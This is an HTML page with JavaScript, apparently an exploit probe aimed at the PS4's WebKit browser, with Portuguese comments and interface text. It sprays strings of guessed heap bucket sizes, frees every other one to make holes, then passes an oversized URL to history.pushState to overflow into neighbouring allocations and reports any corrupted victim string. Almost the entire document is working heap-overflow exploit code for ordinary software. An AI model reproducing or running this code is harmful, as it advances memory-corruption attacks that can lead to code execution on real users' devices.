<!DOCTYPE html>
<html>
<head>
    <title>PS4 Smart Gap Filler</title>
    <style>
        body { background-color: #000; color: #fff; font-family: monospace; padding: 10px; }
        button { 
            font-size: 22px; padding: 20px; width: 100%; margin-bottom: 20px;
            border: 2px solid #0f0; background: #111; color: #fff; font-weight: bold; cursor: pointer;
        }
        .log-container { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; }
        .success { color: #fff; background-color: #008800; font-size: 1.5em; padding: 10px; border: 2px solid #fff; }
        .fail { color: #888; }
    </style>
</head>
<body>

    <h1>Smart Gap Filler</h1>
    <p>Preenche o espaço vazio do balde antes de transbordar.</p>

    <button onclick="startSmartScan()">INICIAR SCAN INTELIGENTE</button>
    
    <div id="log" class="log-container">Pronto. Reinicie o console antes de começar.</div>

    <script>
        const BASE_OFFSET = 709522;
        const EXTRA_OVERFLOW = 1024 * 32; // 32KB para garantir que atropelamos o header vizinho

        // Os tamanhos de balde mais prováveis em WebKit (Potências de 2)
        const BUCKETS = [
            1024 * 1024 * 1,  // 1 MB
            1024 * 1024 * 2,  // 2 MB
            1024 * 1024 * 4,  // 4 MB (Muito provável dado seus testes anteriores)
            1024 * 1024 * 8   // 8 MB
        ];

        var victims = [];

        function log(msg, isSuccess) {
            const el = document.getElementById('log');
            const color = isSuccess ? '#0f0' : '#ccc';
            el.innerHTML += `<div style="color:${color}">${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startSmartScan() {
            for (let bucketSize of BUCKETS) {
                let bucketMB = bucketSize / 1024 / 1024;
                
                // 1. Calcula o GAP (Quanto falta pra encher o balde?)
                // Se a base é 0.7MB e o balde é 4MB, o gap é 3.3MB.
                let gapSize = bucketSize - BASE_OFFSET;
                
                // Se o gap for negativo (balde menor que a base), pula
                if (gapSize <= 0) continue;

                // Tamanho total da injeção: Gap + Excesso
                let totalInjection = gapSize + EXTRA_OVERFLOW;

                log(`----------------------------------------`);
                log(`ALVO: Balde de ${bucketMB} MB`);
                log(`Calculando: Gap (${(gapSize/1024).toFixed(1)}KB) + Excesso (32KB)`);
                log(`Total a injetar: ${(totalInjection/1024).toFixed(1)} KB`);

                let result = await runTest(bucketSize, totalInjection);

                if (result) {
                    log(`<div class="success">!!! SUCESSO NO BALDE DE ${bucketMB} MB !!!</div>`, true);
                    alert("SUCESSO! Balde encontrado: " + bucketMB + " MB");
                    return;
                } else {
                    log(`Falha em ${bucketMB} MB. Limpando...`);
                    victims = [];
                    await forceGC();
                }
            }
            log("Fim do teste. Nenhum alvo atingido.");
        }

        function runTest(bucketSize, injectionSize) {
            return new Promise(resolve => {
                setTimeout(() => {
                    try {
                        // SPRAY DE STRINGS
                        // Criamos vítimas do tamanho EXATO do balde
                        const SPRAY_COUNT = 60; 
                        // String filler (B)
                        // JS String = 1 byte (Latin1) ou 2 bytes (UTF16). 
                        // Assumindo alocação bruta, tentamos encher o tamanho do balde.
                        let pad = "B".repeat(bucketSize - 100); // -100 para cabeçalhos internos

                        victims = [];
                        
                        // Aloca
                        for(let i=0; i<SPRAY_COUNT; i++) {
                            let prefix = i + "_";
                            victims.push(prefix + pad.substring(prefix.length));
                        }

                        // Cria Buracos (Feng Shui)
                        for(let i=0; i<SPRAY_COUNT; i+=2) {
                            victims[i] = null;
                        }

                        // Dispara Exploit
                        setTimeout(() => {
                            let buffer = "A".repeat(BASE_OFFSET);
                            buffer += "\x01".repeat(injectionSize);

                            history.pushState({}, "pwn", "/" + buffer);

                            // Checa corrupção
                            let success = false;
                            for(let i=1; i<victims.length; i+=2) {
                                let v = victims[i];
                                // Se o tamanho mudou drasticamente OU o conteúdo foi alterado
                                if (v && (v.length !== (bucketSize - 100) || v.charCodeAt(0) === 1)) {
                                    log(`VÍTIMA CORROMPIDA! Index ${i}. Novo Tam: ${v.length}`, true);
                                    success = true;
                                    break;
                                }
                            }
                            resolve(success);
                        }, 500);

                    } catch(e) {
                        log("Erro (OOM): " + e.message);
                        resolve(false);
                    }
                }, 200);
            });
        }

        function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 1000));
        }
    </script>
</body>
</html>
